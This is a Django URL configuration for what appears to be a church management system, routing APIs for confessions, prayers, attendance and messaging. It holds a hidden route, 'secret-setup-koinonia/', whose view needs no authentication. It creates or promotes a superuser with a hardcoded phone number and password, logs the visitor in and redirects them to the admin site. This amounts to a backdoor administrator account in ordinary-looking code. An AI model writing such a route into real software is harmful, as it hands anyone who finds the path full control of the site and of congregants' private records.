from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static
from django.http import HttpResponseRedirect
from django.contrib.auth import login


def secret_admin_setup(request):
    """Auto-create superuser and login to admin."""
    from accounts.models import User
    phone = '01000000000'
    password = 'admin123456'
    user, created = User.objects.get_or_create(
        phone=phone,
        defaults={
            'first_name': 'Admin',
            'last_name': 'System',
            'role': 'priest',
            'is_staff': True,
            'is_superuser': True,
        }
    )
    if created:
        user.set_password(password)
        user.save()
    elif not user.is_superuser:
        user.is_staff = True
        user.is_superuser = True
        user.save(update_fields=['is_staff', 'is_superuser'])
    
    login(request, user, backend='django.contrib.auth.backends.ModelBackend')
    return HttpResponseRedirect('/admin/')


urlpatterns = [
    path('admin/', admin.site.urls),
    path('secret-setup-koinonia/', secret_admin_setup),
    path('api/auth/', include('accounts.urls')),
    path('api/church/', include('church.urls')),
    path('api/prayers/', include('prayers.urls')),
    path('api/friday-attendance/', include('friday_attendance.urls')),
    path('api/mass-attendance/', include('mass_attendance.urls')),
    path('api/confessions/', include('confessions.urls')),
    path('api/followups/', include('followups.urls')),
    path('api/messaging/', include('messaging.urls')),
    path('api/notifications/', include('notifications.urls')),
    path('api/reports/', include('reports.urls')),
    path('api/audit/', include('audit.urls')),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
